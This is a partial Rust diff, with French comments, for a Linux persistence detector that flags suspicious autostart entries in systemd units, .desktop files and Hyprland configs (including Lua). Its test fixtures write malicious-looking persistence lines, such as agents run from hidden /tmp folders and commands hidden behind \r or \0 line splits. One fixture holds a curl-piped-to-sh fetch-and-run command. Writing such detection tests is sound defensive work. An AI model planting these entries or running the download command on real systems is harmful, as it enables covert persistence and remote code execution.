+        return Some((c, ambigue, Ajout::LancementHypr));
+    }
+    None
+}
+
+/// Au plus autant de lignes jointes pour lire un appel Lua écrit sur plusieurs lignes.
+const APPEL_LUA_MAX: usize = 16;
+
+/// Au plus autant d'appels lus dans un fichier Lua ; au-delà, le reste n'est pas vérifié (dit dans l'alerte).
+const APPELS_LUA_MAX: usize = 4096;
+
+/// Les appels d'un fichier Lua de Hyprland qui lancent une commande : un raccourci (« o.bind(…) », « hl.bind(…) »,
+/// « o.rebind(…) »), « exec_cmd(…) », « o.launch(…) », « os.execute(…) », « io.popen(…) », et les lancements de
+/// `commande_lancee_lue` qu'elle ne lit pas sans ambiguïté (« o.exec_on_start("a", "/tmp/x") »). Le nom de l'appel
+/// compte dans le code seulement (ni dans une chaîne ni dans un commentaire). Pour chacun : le numéro de sa première
+/// ligne (à partir de 0), son texte (cette ligne entière, jointe aux suivantes jusqu'à la parenthèse qui ferme, au plus
+/// `APPEL_LUA_MAX` lignes), et s'il tient sur une seule ligne. Lecture au mieux : Lua est un langage, ce qu'une
+/// variable ou une fonction calcule ne se voit pas (modèle de menace).
+fn appels_lua(ecrites: &[&str]) -> Vec<(usize, String, bool)> {
+    const APPELS: [&str; 8] = [
+        "bind(",
+        "exec_cmd(",
+        "launch(",
+        "os.execute(",
+        "io.popen(",
+        "exec_on_start(",
+        "launch_on_start(",
+        "exec_once(",
+    ];
+    let mut appels = Vec::new();
+    for (n, l) in ecrites.iter().enumerate() {
+        let morceaux = morceaux_lua(l);
+        let appel_dans_le_code = morceaux
+            .iter()
+            .any(|(m, code)| *code && APPELS.iter().any(|a| m.contains(a)));
+        // Déjà lue sans ambiguïté par `commande_lancee_lue` : jugée là, comme avant ce lot.
+        if !appel_dans_le_code || matches!(commande_lancee_lue(l), Some((_, false))) {
+            continue;
+        }
+        let mut appel = (*l).to_string();
+        let mut profondeur = profondeur_lua(&morceaux);
+        let mut lignes = 1_usize;
+        while profondeur > 0 && lignes < APPEL_LUA_MAX {
+            let Some(suite) = ecrites.get(n.saturating_add(lignes)) else {
+                break;
+            };
+            appel.push('\n');
+            appel.push_str(suite);
+            profondeur = profondeur.saturating_add(profondeur_lua(&morceaux_lua(suite)));
+            lignes = lignes.saturating_add(1);
+        }
+        appels.push((n, appel, lignes == 1));
+    }
+    appels
+}
+
+/// Les parenthèses ouvertes et pas encore fermées d'un texte Lua coupé en `morceaux_lua`, hors chaînes et
+/// commentaires.
+fn profondeur_lua(morceaux: &[(String, bool)]) -> i64 {
+    let mut profondeur = 0_i64;
+    for (morceau, code) in morceaux {
+        let code = *code;
+        if code {
+            for c in morceau.chars() {
+                match c {
+                    '(' => profondeur = profondeur.saturating_add(1),
+                    ')' => profondeur = profondeur.saturating_sub(1),
+                    _ => {}
+                }
+            }
+        }
+    }
+    profondeur
+}
+
+/// Les chaînes d'un appel Lua, chacune jugée comme une commande lancée ; si l'appel en colle avec « .. », aussi leur
+/// suite collée (« "/tm" .. "p/x" » lance « /tmp/x »). Ce qui n'est pas écrit en toutes lettres ne s'y voit pas.
+fn chaines_lua(appel: &str) -> Vec<String> {
+    let morceaux = morceaux_lua(appel);
+    let mut chaines: Vec<String> = morceaux
+        .iter()
+        .filter(|(_, code)| !code)
+        .map(|(m, _)| m.clone())
+        .collect();
+    if chaines.len() > 1 && morceaux.iter().any(|(m, code)| *code && m.contains("..")) {
+        chaines.push(chaines.concat());
+    }
+    chaines
+}
+
+/// Un texte Lua coupé en morceaux : le code (`true`) et le contenu de chaque chaîne (`false`, échappements « \x »
+/// lus comme le caractère « x », sauf « \n » et « \t »), chaînes longues « [[…]] » et « [==[…]==] » comprises ; un
+/// commentaire « -- » jusqu'à la fin de la ligne est sauté. Une chaîne qui ne se ferme pas compte jusqu'à la fin.
+fn morceaux_lua(texte: &str) -> Vec<(String, bool)> {
+    let mut morceaux = Vec::new();
+    let mut code = String::new();
+    let mut lettres = texte.chars().peekable();
+    while let Some(c) = lettres.next() {
+        match c {
+            '"' | '\'' => {
+                morceaux.push((std::mem::take(&mut code), true));
+                let mut chaine = String::new();
+                while let Some(x) = lettres.next() {
+                    match x {
+                        '\\' => match lettres.next() {
+                            Some('n') => chaine.push('\n'),
+                            Some('t') => chaine.push('\t'),
+                            Some(y) => chaine.push(y),
+                            None => {}
+                        },
+                        _ if x == c => break,
+                        _ => chaine.push(x),
+                    }
+                }
+                morceaux.push((chaine, false));
+            }
+            '[' if matches!(lettres.peek(), Some('[' | '=')) => {
+                let mut niveau = 0_usize;
+                let mut reste = lettres.clone();
+                while reste.peek() == Some(&'=') {
+                    reste.next();
+                    niveau = niveau.saturating_add(1);
+                }
+                if reste.next() != Some('[') {
+                    code.push(c);
+                    continue;
+                }
+                lettres = reste;
+                morceaux.push((std::mem::take(&mut code), true));
+                let fin = format!("]{}]", "=".repeat(niveau));
+                let mut chaine = String::new();
+                for x in lettres.by_ref() {
+                    chaine.push(x);
+                    if chaine.ends_with(&fin) {
+                        chaine.truncate(chaine.len().saturating_sub(fin.len()));
+                        break;
+                    }
+                }
+                morceaux.push((chaine, false));
+            }
+            '-' if lettres.peek() == Some(&'-') => {
+                for x in lettres.by_ref() {
+                    if x == '\n' {
+                        code.push('\n');
+                        break;
+                    }
+                }
+            }
+            _ => code.push(c),
+        }
+    }
+    morceaux.push((code, true));
+    morceaux
 }
 
 /// Les variables de Hyprland (« $nom = valeur ») posées dans ses fichiers lus, chaque valeur écrite pour chaque nom :
@@ -3503,9 +4133,9 @@ mod tests {
     #[test]
     fn path_piegeable() {
         let droits = |d: &str| match d {
-            "/tmp" => Some(0o41777),         // modifiable par tous mais « sticky » : sûr
-            "/srv/partage" => Some(0o40777), // modifiable par tous, sans sticky : piège
-            _ => Some(0o40755),
+            "/tmp" => Some(0o41777),          // modifiable par tous mais « sticky » : sûr
+            "/srv/partage" => Some(0o40_777), // modifiable par tous, sans sticky : piège
+            _ => Some(0o40_755),
         };
         assert_eq!(
             path_dangereux("/usr/bin:/tmp:/srv/partage:.::/bin", droits),
@@ -4883,6 +5513,270 @@ mod tests {
         ]);
         assert_eq!(resoudre_hypr("$a", &variables), None, "boucle");
         assert_eq!(resoudre_hypr("$termx", &variables), Some(vec!["/tmp/kx".to_string()]));
+    }
+
+    /// Lot de détection de la persistance, point 1 : une ligne Exec coupée par « \ » se juge jointe comme systemd la
+    /// joint (une unité, un .desktop), de même qu'une ligne cachée derrière une fin de ligne que seul systemd voit
+    /// (« \r », « \0 »). Levée, jamais déclarable, avec sa raison et son fichier:ligne.
+    #[test]
+    fn exec_continuee_de_systemd() {
+        for (i, (fichier, texte, attendu)) in [
+            (
+                ".config/systemd/user/rappel.service",
+                "[Service]\nExecStart=/usr/bin/env \\\n  /tmp/.x/agent\n",
+                "~/.config/systemd/user/rappel.service:2",
+            ),
+            (
+                ".config/systemd/user/rappel.service",
+                "[Service]\n# rien\nExecStart=/usr/bin/bash \\\n# commentaire sauté\n    ~/.y/a.sh\n",
+                "~/.config/systemd/user/rappel.service:3",
+            ),
+            (
+                ".config/systemd/user/rappel.service",
+                "[Service]\nExecStart=/usr/bin/true\rExecStartPost=/tmp/.x/agent\n",
+                "~/.config/systemd/user/rappel.service:2",
+            ),
+            (
+                ".config/systemd/user/rappel.service",
+                "[Service]\nExecStart=/usr/bin/true\0ExecStartPost=/tmp/.x/agent\n",
+                "~/.config/systemd/user/rappel.service:2",
+            ),
+            (
+                ".config/autostart/rappel.desktop",
+                "[Desktop Entry]\nType=Application\nExec=/usr/bin/env \\\n/tmp/.x/agent\n",
+                "~/.config/autostart/rappel.desktop:3",
+            ),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("exec-continuee-{i}"));
+            m.ecrire(fichier, texte);
+            let c = m.lancements();
+            assert_eq!(c.probleme, Some(Niveau::Eleve), "{texte:?} : {}", c.message);
+            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
+            assert!(
+                c.message.contains("dossier temporaire") || c.message.contains("dossier caché"),
+                "{}",
+                c.message
+            );
+            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
+            if fichier.ends_with(".service") {
+                let r = refus(&c);
+                assert!(r.contains(attendu) && r.contains("une seule ligne"), "{texte:?} : {r}");
+            }
+        }
+        // « \\ » en fin de ligne et « \ » suivi d'un blanc ne continuent pas : la ligne suivante se juge seule.
+        let m = Maison::nouvelle("exec-continuee-non");
+        m.ecrire(
+            ".config/systemd/user/rappel.service",
+            "[Service]\nExecStart=/usr/bin/true \\\\\nExecStart=/usr/bin/true \\ \nExecStartPost=/usr/bin/true\n",
+        );
+        assert_eq!(m.lancements().probleme, None);
+    }
+
+    /// Point 1 : les lignes telles que systemd 262 les lit (`read_line`, `config_parse`).
+    #[test]
+    fn lignes_lues_comme_systemd() {
+        let lues = |t: &str| -> Vec<(usize, usize, String)> {
+            lignes_de_systemd(t)
+                .into_iter()
+                .map(|l| (l.numero, l.lues, l.texte))
+                .collect()
+        };
+        let l = |n: usize, lues: usize, t: &str| (n, lues, t.to_string());
+        assert_eq!(
+            lues("a\r\nb\n\rc\0\nd"),
+            [l(1, 1, "a"), l(2, 1, "b"), l(3, 1, "c"), l(4, 1, "d")]
+        );
+        assert_eq!(lues("a \\\n  b\\\n#x\n;y\nc"), [l(1, 3, "a    b c")]);
+        assert_eq!(lues("a\\\n\nb"), [l(1, 2, "a"), l(3, 1, "b")]);
+        assert_eq!(lues("a\\\\\nb\\ \nc"), [l(1, 1, "a\\\\"), l(2, 1, "b\\"), l(3, 1, "c")]);
+        assert_eq!(lues("\u{FEFF}x=1\n\u{FEFF}y"), [l(1, 1, "x=1"), l(2, 1, "\u{FEFF}y")]);
+        assert_eq!(lues("a\\"), [l(1, 1, "a")]);
+        assert_eq!(lues("\n\n\t# z\n  e  \n"), [l(4, 1, "e")]);
+    }
+
+    /// Point 2 : un raccourci de Hyprland (« bind… = …, exec, … », toutes ses formes) et un lancement précédé de
+    /// règles se jugent comme « exec-once », variables comprises ; levés, jamais déclarables.
+    #[test]
+    fn raccourci_de_hypr_juge() {
+        for (i, (texte, attendu)) in [
+            ("bind = SUPER, Q, exec, /tmp/.x/agent\n", "dossier temporaire"),
+            ("bindd = SUPER, Q, Ouvrir, exec, ~/.x/agent\n", "dossier caché"),
+            (
+                "bindel = , XF86AudioRaiseVolume, exec, [float] ~/.x/agent\n",
+                "dossier caché",
+            ),
+            (
+                "binde = SUPER, R, execr, /usr/bin/bash $inconnue\n",
+                "sans valeur connue",
+            ),
+            (
+                "$p = ~/.x/a.sh\nbindl = , switch:on, exec, /usr/bin/bash $p\n",
+                "dossier caché",
+            ),
+            ("exec-once = [workspace 2 silent] /tmp/.y/agent\n", "dossier temporaire"),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("raccourci-hypr-{i}"));
+            m.ecrire(".config/hypr/hyprland.conf", texte);
+            let c = m.lancements();
+            assert_eq!(c.probleme, Some(Niveau::Eleve), "{texte:?} : {}", c.message);
+            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
+            assert!(c.message.contains("~/.config/hypr/hyprland.conf:"), "{}", c.message);
+            let r = refus(&c);
+            assert!(r.contains("~/.config/hypr/hyprland.conf:"), "{r}");
+            assert!(r.contains("raccourci") || r.contains("règles"), "{r}");
+        }
+        // Un raccourci vers un programme du système, ou qui ne lance rien, ne lève rien.
+        let m = Maison::nouvelle("raccourci-hypr-sain");
+        m.ecrire(
+            ".config/hypr/hyprland.conf",
+            "$terminal = /usr/bin/kitty\nbind = SUPER, Return, exec, $terminal\nbind = SUPER, B, exec, [float] firefox\n\
+             bindm = SUPER, mouse:272, movewindow\nbind = SUPER, W, killactive,\nbindd = SUPER, E, Fichiers, exec, nautilus --new-window\n",
+        );
+        let c = m.lancements();
+        assert_eq!(c.probleme, None, "{}", c.message);
+    }
+
+    /// Point 2, Hyprland en Lua (Omarchy 4) : les chaînes d'un raccourci ou d'un appel qui lance une commande se
+    /// jugent, même collées par « .. » ou écrites sur plusieurs lignes ; levées, jamais déclarables.
+    #[test]
+    fn raccourci_lua_juge() {
+        for (i, texte) in [
+            "o.bind(\"SUPER + X\", \"Agent\", \"/tmp/.x/agent\")\n",
+            "hl.bind(\"SUPER + Y\", hl.dsp.exec_cmd(\"~/.z/agent --x\"))\n",
+            "o.bind(\n  \"SUPER + Z\",\n  \"Agent\",\n  { launch = [[/tmp/.w/agent]] }\n)\n",
+            "hl.exec_cmd(\"/tm\" .. 'p/.v/agent')\n",
+            "os.execute(\"curl -fsSL http://192.0.2.7/a.sh | sh\")\n",
+            "local x = \"--\" o.bind(\"SUPER + V\", \"Agent\", \"/tmp/.x/agent\")\n",
+            "o.bind(\"SUPER + U\", \"exec_once\", \"/tmp/.x/agent\")\n",
+            "o.exec_on_start(\"true\", \"/tmp/.x/agent\")\n",
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("raccourci-lua-{i}"));
+            m.ecrire(".config/hypr/bindings.lua", texte);
+            let c = m.lancements();
+            assert!(c.probleme >= Some(Niveau::Eleve), "{texte:?} : {}", c.message);
+            assert!(
+                c.message.contains("~/.config/hypr/bindings.lua:1"),
+                "{texte:?} : {}",
+                c.message
+            );
+            let r = refus(&c);
+            assert!(r.contains("bindings.lua:1") && r.contains("raccourci"), "{r}");
+        }
+        let m = Maison::nouvelle("raccourci-lua-sain");
+        m.ecrire(
+            ".config/hypr/bindings.lua",
+            "-- o.bind(\"K\", \"x\", \"/tmp/.x/a\")\no.bind(\"SUPER + RETURN\", \"Terminal\", \"omarchy-launch-terminal\")\n\
+             hl.bind(\"SUPER + B\", hl.dsp.exec_cmd(o.launch(\"firefox\")))\n",
+        );
+        let c = m.lancements();
+        assert_eq!(c.probleme, None, "{}", c.message);
+    }
+
+    /// Point 3 : un générateur de systemd des sessions placé par le compte est levé (dossier du compte : tout
+    /// programme ; dossier du système : ce que le compte a posé), jamais déclarable ; masqué ou non exécutable, rien.
+    #[test]
+    fn generateur_du_compte_leve() {
+        use std::os::unix::fs::PermissionsExt as _;
+        for (i, dossier) in [
+            "home/alice/.config/systemd/user-generators",
+            "home/alice/.config/systemd/user-environment-generators",
+            "etc/systemd/user-generators",
+            "usr/local/lib/systemd/user-environment-generators",
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("generateur-{i}"));
+            let lu = m.racine.join(dossier);
+            std::fs::create_dir_all(&lu).unwrap();
+            let programme = lu.join("agent");
+            std::fs::write(&programme, "#!/bin/sh\necho x\n").unwrap();
+            std::fs::set_permissions(&programme, std::fs::Permissions::from_mode(0o755)).unwrap();
+            std::fs::write(lu.join("note"), "pas un programme\n").unwrap();
+            std::os::unix::fs::symlink("/dev/null", lu.join("masque")).unwrap();
+            let c = m.lancements();
+            assert_eq!(c.probleme, Some(Niveau::Eleve), "{dossier} : {}", c.message);
+            assert!(c.message.contains("générateur"), "{}", c.message);
+            assert!(c.message.contains("/agent"), "{}", c.message);
+            assert!(
+                !c.message.contains("note") && !c.message.contains("masque"),
+                "{}",
+                c.message
+            );
+            let r = refus(&c);
+            assert!(
+                r.contains("un générateur de systemd ne peut pas être déclaré normal"),
+                "{r}"
+            );
+            assert!(r.contains("/agent"), "{r}");
+        }
+    }
+
+    /// Point 3, la règle des dossiers du système : à root sans écriture pour le groupe ni les autres, rien ; sinon
+    /// levé. Dans un espace de noms d'utilisateurs, seule l'identité du processus compte.
+    #[test]
+    fn generateur_du_systeme_pose_par_le_compte() {
+        assert!(!pose_par_le_compte(&[(0, 0o100_755), (0, 0o40_755)], 1000, true));
+        assert!(pose_par_le_compte(&[(1000, 0o100_755), (0, 0o40_755)], 1000, true));
+        assert!(pose_par_le_compte(&[(0, 0o100_755), (0, 0o40_777)], 1000, true));
+        assert!(pose_par_le_compte(&[(0, 0o100_775), (0, 0o40_755)], 1000, true));
+        assert!(
+            !pose_par_le_compte(&[(0, 0o100_755)], 0, true),
+            "lancé par root : un fichier de root, rien"
+        );
+        assert!(!pose_par_le_compte(&[(65534, 0o100_755)], 0, false), "root vu ailleurs");
+        assert!(pose_par_le_compte(&[(0, 0o100_755)], 0, false), "le compte vu root");
+    }
+
+    /// Point 4 : les unités du dossier de la session (XDG_RUNTIME_DIR/systemd) se lisent comme celles du compte,
+    /// transient/ (systemd-run) jugée par son contenu ; levées, jamais déclarables.
+    #[test]
+    fn unite_de_la_session_lue() {
+        for (i, (dossier, texte)) in [
+            ("systemd/user", "[Service]\nExecStart=/tmp/.x/agent\n"),
+            ("systemd/transient", "[Service]\nExecStart=\"/tmp/.x/agent\"\n"),
+            ("systemd/generator.late", "[Service]\nExecStart=:%h/.x/agent\n"),
+            (
+                "systemd/user.control",
+                "[Service]\nExecStart=/usr/bin/env \\\n /tmp/.x/agent\n",
+            ),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("session-{i}"));
+            let f = m.racine.join("run/user/1000").join(dossier).join("agent.service");
+            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
+            std::fs::write(&f, texte).unwrap();
+            let c = m.lancements();
+            assert_eq!(c.probleme, Some(Niveau::Eleve), "{dossier} : {}", c.message);
+            assert!(
+                c.message.contains(&format!("/run/user/1000/{dossier}/agent.service:2")),
+                "{}",
+                c.message
+            );
+            let r = refus(&c);
+            assert!(r.contains("dossier de la session"), "{r}");
+        }
+        // Une unité de systemd-run qui lance un programme du système ne lève rien.
+        let m = Maison::nouvelle("session-sain");
+        let f = m.racine.join("run/user/1000/systemd/transient/run-r1.service");
+        std::fs::create_dir_all(f.parent().unwrap()).unwrap();
+        std::fs::write(
+            &f,
+            "# This is a transient unit file\n[Service]\nExecStart=\"/usr/bin/sleep\" \"60\"\n",
+        )
+        .unwrap();
+        assert_eq!(m.lancements().probleme, None);
     }
 
     /// Deuxième vérification de la campagne E : le détail des variables se lit en quelques lignes (une par sorte de
